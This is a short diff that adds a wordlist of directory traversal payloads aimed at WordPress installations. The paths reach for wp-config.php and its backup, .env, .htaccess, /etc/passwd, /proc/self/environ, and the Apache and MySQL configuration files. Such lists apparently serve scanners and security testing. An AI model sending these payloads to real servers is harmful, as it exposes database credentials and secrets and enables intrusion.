@@ -1,0 +1,13 @@
+../wp-config.php
+../wp-config.php.bak
+../wp-config-sample.php
+../.htaccess
+../.env
+../wp-includes/version.php
+../../../../etc/passwd
+../../../../etc/hostname
+../../../../etc/os-release
+../../../../proc/self/environ
+../../../../proc/self/cmdline
+../../../../etc/apache2/apache2.conf
+../../../../etc/mysql/my.cnf
